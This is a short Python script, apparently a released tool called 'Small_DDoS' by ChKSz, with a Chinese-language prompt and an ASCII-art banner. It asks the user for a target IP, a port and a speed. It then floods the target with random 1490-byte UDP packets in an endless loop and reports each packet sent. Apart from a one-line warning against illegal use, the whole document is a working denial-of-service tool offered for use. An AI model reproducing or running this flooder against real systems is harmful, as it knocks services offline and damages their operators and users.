#python 3
#由chksz原创

import sys
import os
import time
import socket
import random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
print("  ____                     _  _       ____   ____         ____  ")
print(" / ___|  _ __ ___    __ _ | || |     |  _ \ |  _ \   ___ / ___| ")
print(" \___ \ | '_ ` _ \  / _` || || |     | | | || | | | / _ \\___ \ ")
print("  ___) || | | | | || (_| || || |     | |_| || |_| || (_) |___) |")
print(" |____/ |_| |_| |_| \__,_||_||_|_____|____/ |____/  \___/|____/ ")
print("                               |_____|                          ")
print("  ____            ____  _      _  __ ____                       ")
print(" | __ )  _   _   / ___|| |__  | |/ // ___| ____                 ")
print(" |  _ \ | | | | | |    |  _ \ |   / \___ \|_  /                 ")
print(" | |_) || |_| | | |___ | | | ||   \  ___) |/ /                  ")
print(" |____/  \__  |  \____||_| |_||_|\_\|____//___|                 ")
print("         |___/                                                  ")
print(" ")
print("--------------------------------------------------------")
print("   Made By          :ChKSz                              ")
print("   Version          :v1.3-20250121164937                ")
print("   Released URL     :https://github.com/ChKSz/Small_DDoS")
print("--------------------------------------------------------")
print(" ")
print("----------严禁将其用于非法目的,违者后果自负!!!----------")
print(" ")
ip = input("请输入被攻击的IP:")
port = int(input("请输入被攻击IP的端口:"))
sd = int(input("请输入攻击速度(1~1000):"))

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("sent %s data %s to port %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)
